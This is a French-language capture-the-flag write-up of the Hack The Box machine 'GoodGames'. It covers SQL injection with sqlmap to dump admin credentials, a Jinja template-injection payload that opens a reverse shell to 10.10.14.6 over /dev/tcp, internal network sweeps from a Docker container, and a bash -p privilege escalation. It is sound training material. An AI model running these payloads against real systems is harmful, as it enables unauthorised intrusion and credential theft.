---
title: "GoodGame-HTB"
date: 2025-05-03T20:00:00+02:00
draft: false
tags: ["hackthebox", "writeup",]
categories: ["writeup"]
summary: "Difficulte : esay"
showToc: true
tocOpen: true
---

# Enumeration 
## Nmap 

Nous débutons notre phase de reconnaissance par un scan Nmap de la cible.

```bash
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
```

L’analyse révèle que seul le port **80** est ouvert et qu’il héberge un serveur HTTP Python via **Werkzeug 2.0.2**.

---

## Serveur Web Python

En accédant au site via le port 80, nous tombons sur une interface web : `http://goodgames.htb/`

> _Ajout de l’entrée DNS au fichier hosts :_

```bash
sudo echo "10.10.11.130   goodgames.htb" >> /etc/hosts
```

En inspectant la fonctionnalité de connexion, une tentative d'injection SQL est envisagée. Toutefois, l'application impose la saisie d’une adresse e-mail valide.

Nous utilisons alors une adresse valide, puis interceptons la requête dans **Burp Suite** pour modifier l’e-mail en `admin@goodgames.htb`. Une fois soumise, un message de bienvenue s’affiche, indiquant une possible compromission du compte administrateur.

![Connexion réussie](/images/20250417163258.png)

---

## Injection SQL

Après confirmation d'une vulnérabilité SQLi, nous enregistrons la requête HTTP dans un fichier nommé `goodgames.req` afin de l'exploiter avec **sqlmap**.

```bash
sqlmap -r goodgames.req --dbs
```

Sqlmap révèle deux bases de données :

- `information_schema`
    
- `main`
    

![Bases de données détectées](/images/20250417165918.png)

Nous listons ensuite les tables de la base `main` :

```bash
sqlmap -r goodgames.req -D main --tables
```

![Tables listées](/images/20250417170201.png)

Et enfin, nous extrayons les données de la table `user` :

```bash
sqlmap -r goodgames.req -D main -T user --dump
```

![Dump utilisateurs](/images/20250417171542.png)

Résultat :

```
admin@goodgames.htb : superadministrator
```

---

## Portail Interne d'Administration

En haut à droite du tableau de bord, une icône d’engrenage mène à une URL interne :  
`http://internal-administration.goodgames.htb/login`

> _Ajout de l’entrée dans le fichier hosts :_

```bash
sudo echo "10.10.11.130   internal-administration.goodgames.htb" >> /etc/hosts
```

Nous utilisons les identifiants extraits (`admin / superadministrator`) pour accéder à l’interface d'administration. Cela nous donne accès au dashboard.

![Dashboard admin](/images/20250421140123.png)

---

## SSTI (Server-Side Template Injection)

Nous suspectons une vulnérabilité **SSTI**. Une charge utile de test est injectée :

```jinja
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

![Test SSTI](/images/20250421141229.png)

La commande est exécutée, confirmant la vulnérabilité. Nous exploitons cela pour obtenir un reverse shell :

```jinja
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}
```

![Reverse shell SSTI](/images/20250421141957.png)

---

## Escalade de Privilèges

### Énumération

L’environnement montre plusieurs signes d’une exécution dans un **conteneur Docker**. On y observe également des fichiers liés à un utilisateur inconnu (`UID 1000`) inexistant dans `/etc/passwd`.

![Fichiers docker](/images/20250421142430.png)

Une adresse IP privée suggère une architecture en réseau Docker. Nous réalisons un scan ping :

```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done
```

Et un scan des ports :

```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

Le processus `docker` est actif sur le système.

![Processus docker](/images/20250421143838.png)

L'utilisateur `augustus`, présent sur le système, dispose d’un répertoire utilisateur contenant des fichiers identiques à ceux du conteneur.

---

## Évasion de Conteneur & Accès Root

Nous copions `/bin/bash` dans le répertoire d’**augustus** :

![Copie bash](/images/20250421145143.png)

Puis exécutons le binaire avec l’option `-p` pour préserver les privilèges root :

![Bash -p](/images/20250421145406.png)

```bash
./bash -p
```

Cela nous accorde un shell avec les droits root hors du conteneur.

